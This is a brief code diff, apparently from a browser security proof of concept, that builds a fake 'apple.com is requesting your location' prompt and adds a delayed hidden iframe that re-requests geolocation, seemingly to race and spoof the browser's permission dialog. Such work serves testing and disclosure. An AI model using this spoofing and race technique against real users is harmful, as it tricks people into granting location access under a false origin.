@@ -44,11 +44,16 @@
         <img src='https://www.apple.com/favicon.ico'> <b>apple.com</b> is requesting your location.
         <p>This is used to verify your region settings.</p>
         <button onclick=\"req()\">Allow</button>
-        <iframe src='data:text/html,<script>navigator.geolocation.getCurrentPosition(()=>{},()=>{});</script>' style='display:none'></iframe>
+        <iframe id=\"raceframe\" style=\"display:none;\"></iframe>
       </div>
       <script>
         function req() {
           navigator.geolocation.getCurrentPosition(() => {}, () => {});
+          setTimeout(() => {
+            const frame = document.getElementById('raceframe');
+            const src = 'data:text/html,<script>navigator.geolocation.getCurrentPosition(() => {}, () => {});<\/script>';
+            frame.src = src;
+          }, 1000);
         }
       <\/script>
     `;
